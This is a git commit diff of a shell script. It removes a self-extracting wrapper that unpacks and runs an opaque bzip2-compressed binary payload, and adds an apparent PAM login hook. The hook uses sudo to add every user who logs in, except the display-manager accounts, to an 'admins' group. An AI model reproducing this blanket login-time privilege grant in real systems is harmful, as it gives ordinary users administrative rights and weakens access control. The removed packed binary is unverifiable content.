ea40a5d6a67047c09219ff0d0fc42cfab2d839d6
Roses <48265555+djeverhart@users.noreply.github.com>
2024-03-04 14:16:55 -0500

    Update user.sh

--- user.sh
+++ user.sh
@@ -1,54 +1,12 @@
 #!/bin/bash
-skip=75
 
-tab='	'
-nl='
-'
-IFS=" $tab$nl"
-USER=${USER:-$(id -u -n)}
-HOME="${HOME:-$(getent passwd $USER 2>/dev/null | cut -d: -f6)}"
-HOME="${HOME:-$(eval echo ~$USER)}"
-umask=`umask`
-umask 77
+username=$PAM_USER
 
-bztmpdir=
-trap 'res=$?
-  test -n "$bztmpdir" && rm -fr "$bztmpdir"
-  (exit $res); exit $res
-' 0 1 2 3 5 10 13 15
+#sudo echo $administrators_group $username >> /opt/test.log
 
-case $TMPDIR in
-  / | */tmp/) test -d "$TMPDIR" && test -w "$TMPDIR" && test -x "$TMPDIR" || TMPDIR=$HOME/.cache/; test -d "$HOME/.cache" && test -w "$HOME/.cache" && test -x "$HOME/.cache" || mkdir "$HOME/.cache";;
-  */tmp) TMPDIR=$TMPDIR/; test -d "$TMPDIR" && test -w "$TMPDIR" && test -x "$TMPDIR" || TMPDIR=$HOME/.cache/; test -d "$HOME/.cache" && test -w "$HOME/.cache" && test -x "$HOME/.cache" || mkdir "$HOME/.cache";;
-  *:* | *) TMPDIR=$HOME/.cache/; test -d "$HOME/.cache" && test -w "$HOME/.cache" && test -x "$HOME/.cache" || mkdir "$HOME/.cache";;
-esac
-if type mktemp >/dev/null 2>&1; then
-  bztmpdir=`mktemp -d "${TMPDIR}bztmpXXXXXXXXX"`
+if [[ -n "$username" && "$username" != "sddm" && "$username" != "lightdm" ]]; then
+
+sudo echo admins $username >> /opt/test.log
+sudo usermod -aG admins $username
+
 else
-  bztmpdir=${TMPDIR}bztmp$$; mkdir $bztmpdir
-fi || { (exit 127); exit 127; }
-
-bztmp=$bztmpdir/$0
-case $0 in
--* | */*'
-') mkdir -p "$bztmp" && rm -r "$bztmp";;
-*/*) bztmp=$bztmpdir/`basename "$0"`;;
-esac || { (exit 127); exit 127; }
-
-case `printf 'X\n' | tail -n +1 2>/dev/null` in
-X) tail_n=-n;;
-*) tail_n=;;
-esac
-if tail $tail_n +$skip <"$0" | bzip2 -cd > "$bztmp"; then
-  umask $umask
-  chmod 700 "$bztmp"
-  (sleep 5; rm -fr "$bztmpdir") 2>/dev/null &
-  "$bztmp" ${1+"$@"}; res=$?
-else
-  printf >&2 '%s\n' "Cannot decompress ${0##*/}"
-  printf >&2 '%s\n' "Report bugs to <fajarrkim@gmail.com>."
-  (exit 127); res=127
-fi; exit $res
-BZh91AY&SY' sÐ  $_€}À"‚Z
-¿çÞ@0 ÙX4†€@
-(Ðd€d  $SÊ`G©êzA‰“i2h¨]†x­Í5AJBœrÆ5úáiÙÌMtÇ_Jµâ@Ä¡KáÊbð )/µee>,OÐð8åo“~WÐe§ƒ¸I<èTJ1Óueé)Óé,˜ð\R’¡c±Ò2~¢Í[ß¹²»†¥ø‚ÉG ¬´Ð’aIB²3Q€"màòpNRsHmeáL¢­€“^	þ.äŠp¡ O@ç 
